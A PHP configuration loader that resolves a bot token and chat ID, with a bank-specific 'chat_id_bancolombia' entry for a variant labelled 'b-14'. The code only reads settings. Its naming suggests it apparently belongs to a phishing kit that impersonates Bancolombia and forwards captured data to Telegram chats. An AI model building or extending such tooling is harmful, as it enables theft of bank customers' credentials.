<?php
$projectRoot = __DIR__;
while ($projectRoot !== dirname($projectRoot)) {
    if (is_dir($projectRoot . '/token_bank') && file_exists($projectRoot . '/token_bank/config.php')) {
        break;
    }
    $projectRoot = dirname($projectRoot);
}

$tokenBankPath = $projectRoot . '/token_bank/config.php';
$tokenBank = file_exists($tokenBankPath) ? require $tokenBankPath : [];

// Para Bancolombia b-14, recuperar el chat_id_bancolombia en lugar del default/general si existe
$bot_token = $tokenBank['bot_token'] ?? '';
$chat_id   = $tokenBank['chat_id_bancolombia'] ?? $tokenBank['chat_id'] ?? '';

if (empty($bot_token) || empty($chat_id)) {
    // Si no está definido directo, buscar en default
    $defaultConfig = $tokenBank['default'] ?? null;
    if (is_array($defaultConfig)) {
        $bot_token = $defaultConfig['bot_token'] ?? '';
        $chat_id   = $tokenBank['chat_id_bancolombia'] ?? $defaultConfig['chat_id'] ?? '';
    }
}

if (empty($bot_token) || empty($chat_id)) {
    $rootConfigPath = $projectRoot . '/config.php';
    if (file_exists($rootConfigPath)) {
        $resolved = require $rootConfigPath;
        $bot_token = $resolved['bot_token'] ?? '';
        $chat_id   = $resolved['chat_id'] ?? '';
    }
}

return [
    'bot_token' => (string) $bot_token,
    'chat_id'   => (string) $chat_id,
];
